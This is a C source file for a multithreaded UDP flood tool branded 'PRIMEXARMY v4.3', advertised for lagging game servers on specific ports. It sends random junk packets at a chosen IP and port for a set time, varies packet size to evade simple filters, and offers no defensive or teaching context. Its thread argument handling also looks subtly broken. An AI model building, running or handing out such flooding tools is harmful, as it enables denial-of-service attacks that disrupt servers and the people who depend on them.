#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

/* 
   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝘃𝟰.𝟯 - 𝗨𝗗𝗣 𝗙𝗥𝗘𝗘𝗭𝗘 𝗘𝗡𝗚𝗜𝗡𝗘 ⚔️
   Specialized for Game Server Lag (UDP 10012/17500)
*/

void *prime_strike(void *arg) {
    char **args = (char **)arg;
    char *ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);

    int sock;
    struct sockaddr_in server_addr;
    
    // Creating UDP Socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        return NULL;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    // PRIME-V4 Payload: 1024 bytes of high-entropy junk data
    char payload[1024];
    for (int i = 0; i < 1024; i++) {
        payload[i] = (char)(rand() % 256);
    }

    time_t end_time = time(NULL) + duration;

    // High-Speed Flooding Loop
    while (time(NULL) < end_time) {
        // Randomizing packet size slightly to bypass simple filters
        int packet_size = 800 + (rand() % 224); 
        sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗖𝗢𝗥𝗘 𝘃𝟰.𝟯  ⚔️\n");
        printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_id[threads];
    srand(time(NULL));

    printf("🚀 [PRIMEXARMY] Starting Strike on %s:%d\n", ip, port);
    printf("📡 [ENGINE] Deploying %d Threads for %d seconds...\n", threads, duration);

    // Launching Threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_id[i], NULL, prime_strike, (void *)argv + 8)) {
            // Passing args offset for thread safety
        }
    }

    // Joining Threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("✅ [STRIKE] Operation PRIMEXARMY Finished.\n");
    return 0;
}